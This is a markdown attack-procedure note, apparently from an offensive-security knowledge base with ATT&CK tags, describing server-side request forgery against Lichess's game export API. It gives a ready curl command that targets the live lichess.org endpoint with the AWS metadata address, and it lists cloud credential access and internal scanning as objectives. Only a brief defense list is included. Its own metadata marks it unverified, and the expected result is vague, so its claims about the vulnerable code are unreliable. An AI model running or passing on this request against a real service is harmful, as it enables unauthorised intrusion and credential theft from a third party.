---
id: proc-lichess-ssrf-request-001
tags:
  - ssrf
  - exploit
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-send-ssrf-request]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:48.381Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft Malicious Request to Game Export Endpoint

## Summary

This procedure crafts and sends HTTP requests to Lichess game export API endpoints, injecting an arbitrary URL into the 'players' parameter to trigger SSRF and force server-side requests to internal or sensitive resources like AWS metadata.

## Description

The Lichess game export API, built on Scala and Play Framework, lacks validation on the 'players' query parameter, directly passing it to an HTTP client in RealPlayer.scala. This allows attackers to specify URLs like http://169.254.169.254/latest/meta-data/ for cloud metadata exfiltration or internal scanning. No authentication is needed, making it accessible via public endpoints such as /game/export/[GAME_ID], /api/games/export/_ids, or /api/games/user/[USERNAME].

## Requirements

1. Valid game ID from prior reconnaissance
2. HTTP client like curl
3. Knowledge of target internal URLs (e.g., AWS metadata)

## Defense

Defensive measures and detection strategies:

- Implement URL whitelisting or validation in API parameters
- Log and monitor outbound HTTP requests from the server
- Use web application firewalls (WAF) to block suspicious query parameters

## Objectives

1. Trigger server-side HTTP request to arbitrary URL
2. Access internal endpoints or cloud credentials
3. Enable port scanning or data exposure

## Instructions

### Step 1: Prepare the Malicious URL

**Context**: Select a target internal endpoint, such as AWS instance metadata, to inject into the 'players' parameter.

No command; define the URL, e.g., http://169.254.169.254/latest/meta-data/.

> This URL points to sensitive cloud data if Lichess runs on AWS.

### Step 2: Send the SSRF Request

**Context**: Execute the request using [[commands/curl-send-ssrf-request]] to the game export endpoint.

**Command** ([[commands/curl-send-ssrf-request]]):
```bash
curl "https://lichess.org/game/export/[GAME_ID]?players=http://169.254.169.254/latest/meta-data/" -v
```

> The -v flag provides verbose output. Replace [GAME_ID] with a valid ID. Expected output includes a 200 OK from Lichess, with potential indirect evidence of SSRF in server behavior.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques


## Commands Used

- [[commands/curl-send-ssrf-request]]

## Tools Used


## Tags

- ssrf
- exploit
